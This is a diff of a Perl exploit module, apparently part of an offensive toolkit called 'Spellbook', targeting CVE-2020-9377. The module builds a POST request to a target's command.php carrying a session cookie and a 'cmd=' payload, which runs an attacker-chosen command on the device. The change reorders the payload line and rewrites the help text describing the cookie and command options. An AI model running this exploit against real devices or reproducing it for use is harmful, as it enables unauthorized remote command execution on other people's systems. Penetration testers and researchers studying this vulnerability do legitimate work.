@@ -21,13 +21,13 @@ package Spellbook::Advisory::CVE_2020_9377 {
             }
 
             my $userAgent = Spellbook::Core::UserAgent -> new();
+            my $payload   = "cmd=$command";
             
             my $headers   = HTTP::Headers -> new (
                 "Content-Type" => "application/x-www-form-urlencoded",
                 "Cookie" => "uid=$cookie"
             );
 
-            my $payload   = "cmd=$command";
             my $request   = HTTP::Request -> new("POST", "$target/command.php", $headers, $payload);
             my $response  = $userAgent -> request($request);
 
@@ -44,8 +44,8 @@ package Spellbook::Advisory::CVE_2020_9377 {
                 \r=======================
                 \r-h, --help     See this menu
                 \r-t, --target   Define a target
-                \r-c, --cokie    cookie
-                \r-p, --payload  command\n\n";
+                \r-c, --cokie    Define a session cookie
+                \r-p, --payload  Set the command to run on the target\n\n";
         }
 
         return 0;
